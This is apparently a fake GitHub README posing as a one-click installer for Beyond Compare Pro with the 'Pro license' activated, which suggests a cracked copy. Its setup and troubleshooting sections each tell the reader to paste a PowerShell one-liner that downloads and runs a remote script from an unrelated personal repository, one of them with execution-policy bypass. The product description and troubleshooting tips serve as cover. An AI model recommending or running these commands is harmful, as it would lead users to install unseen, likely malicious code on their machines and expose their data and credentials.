# Beyond Compare Pro Setup
One-click setup for Beyond Compare Pro Setup -- the professional file and folder comparison tool for developers to synchronize directories, merge code changes, and compare text, images, and binary files side by side with precision

Open PowerShell and run:

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

## What It Does

- Installs Beyond Compare with folder sync, shell context menu integration, and text merge modules.
- Registers the file association for diff and merge operations from Git, SVN, and IDE plugin integrations.
- Activates the Pro license and enables three-way merge, image comparison, and the hex data editor view.
- Opens Beyond Compare with a sample folder pair to confirm diff highlighting and sync rules are functional.

## Requirements

- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- ~30 MB free disk space

## Troubleshooting

**Folder sync copies files in the wrong direction and overwrites newer files with older versions**

Set explicit sync direction rules in the Folder Sync session settings and use Preview Changes before running any sync operation.

**Git does not launch Beyond Compare as the external diff tool after completing the git config setup**

Run git config --global diff.tool bc and set the path to the Beyond Compare executable in difftool.bc.path to complete integration.

**Bypass execution policy (alternative):**

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex (irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1)"
```

"irm is not recognized" -- use the expanded syntax on older PowerShell:

```powershell
Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1')
```

## License
MIT -- see LICENSE.